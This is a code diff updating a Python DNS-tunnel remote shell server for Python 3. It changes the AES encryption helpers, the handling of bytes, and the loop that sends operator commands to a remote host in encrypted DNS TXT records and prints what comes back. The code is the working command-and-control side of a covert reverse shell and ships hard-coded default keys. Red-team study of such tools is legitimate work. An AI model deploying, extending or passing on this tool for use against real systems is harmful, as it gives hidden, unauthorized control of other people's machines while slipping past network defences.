@@ -25,7 +25,7 @@ NXT_CMD = base64.b64encode(b"nxt")
 PROMPT = 'SHELL >> '
 #PROMPT_COLORED = '\033[33mSHELL\033[0m \033[35m>> \033[0m'
 BLOCK_SIZE = 32  # Block size for cipher object: must be 16, 24, or 32 for AES
-PADDING = '{'  # Character used for padding
+PADDING = '{'.encode()  # Character used for padding
 EXIT = 0 # Used to keep track of 'quit' command
 # REPLACE THIS WITH YOUR OWN KEY AND IV #
 secret = os.environ.get("SECRET","TyKuwAt5vg1m48z2qYs6cUalHQrDpG0B").encode()
@@ -35,18 +35,19 @@ iv = os.environ.get("IV","1cYGbLz8qN4umT4c").encode()
 PAD = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
 
 # Encrypt with AES, encode with base64:
-EncodeAES = lambda c, s: base64.b64encode(c.encrypt(PAD(s)))
+EncodeAES = lambda c, s: base64.b64encode(c.encrypt(PAD(s.encode())))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
 
 # create a CBC cipher object using a random secret and iv
-cipher = AES.new(secret, AES.MODE_CBC, iv)
+cipher_enc = AES.new(secret, AES.MODE_CBC, iv)
+cipher_dec = AES.new(secret, AES.MODE_CBC, iv)
 
 def encrypt(string):
-  encoded = EncodeAES(cipher, string)
+  encoded = EncodeAES(cipher_enc, string)
   return encoded
 
 def decrypt(string):
-  decoded = DecodeAES(cipher, string)
+  decoded = DecodeAES(cipher_dec, string)
   return decoded
 
 def killApplication():
@@ -58,7 +59,7 @@ def spawnShell(answer, payload):
   shellInput = input(PROMPT)
   if shellInput == 'quit': EXIT = 1 #Set program to exit cleanly
   if shellInput == '': spawnShell(answer, payload) # Prevents whitespace issues
-  out = base64.b64encode(encrypt(shellInput))
+  out = base64.b64encode(encrypt(shellInput)).decode()
   answer.add_answer(
     *dnslib.RR.fromZone('{}.com 60 TXT "{}"'.format(payload, out)))
   return answer
@@ -79,13 +80,13 @@ def recievePayload(udps):
   return addr, payload, answer
 
 def printResult(cmd_list):
-  try:
+  # try:
     b64Cmd = ''.join(cmd_list)
     b64Cmd = dashDecode(b64Cmd)
     print('{}'.format(decrypt(base64.b64decode(b64Cmd))).strip())
-  except:
-    # Base64 Decode Failed.
-    print('[ERROR]: Couldn\'t Read Result from Host!')
+  # except:
+  #   # Base64 Decode Failed.
+  #   print('[ERROR]: Couldn\'t Read Result from Host!')
 
 def shellIntro():
   for line in DNSHELL.split('\n'):
@@ -108,7 +109,7 @@ def main():
     while 1:
       addr, payload, answer = recievePayload(udps)
       if (payload == NXT_CMD):
-        printResult(cmd_list)
+        printResult([x.decode() for x in cmd_list])
         cmd_list = []
         answer = spawnShell(answer, payload)
       else:
